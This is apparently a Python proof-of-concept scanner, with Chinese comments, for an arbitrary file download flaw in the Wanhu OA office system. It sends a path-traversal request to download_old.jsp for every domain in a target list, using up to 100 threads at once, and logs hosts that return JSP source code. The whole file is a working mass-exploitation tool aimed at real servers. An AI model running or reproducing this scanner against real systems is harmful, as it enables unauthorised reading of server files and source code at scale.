#  万户OAdownload.jsp文件存在任意文件下载漏洞。
#  作者 charis

import requests
from requests.packages import urllib3
urllib3.disable_warnings()
from threading import Thread, enumerate
from time import sleep

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept-Language": "gzip, deflate"
}

proxies = {
    "http": "http://127.0.0.1:10811",
    "https": "https://127.0.0.1:10811",
}

def postData(url, headers, proxies):
    try:
        s = ""
        poc = "/defaultroot/download_old.jsp?path=..&name=x&FileName=index.jsp"
        urldata = url.strip("\n") + poc
        requests.packages.urllib3.disable_warnings()
        re = requests.post(urldata, headers=headers, proxies=proxies, verify=False)
        if re.status_code == 200:
            if re.text.find("<%") >= 0:
                print("[+]存在任意文件读取", url)
                s += url
        with open("D:\\code\\python\\exp\\万户OAdownload\\result.txt", "a", encoding="utf-8") as f:
            f.write(s)

    except requests.exceptions.ConnectionError:
        pass

with open("D:\\code\\python\\exp\\万户OAdownload\\domain.txt", encoding="utf-8") as f:
    for i in f.readlines():
        if len(enumerate()) < 100:
            Thread(target=postData, args=(i, headers, proxies)).start()
        else:
            sleep(1)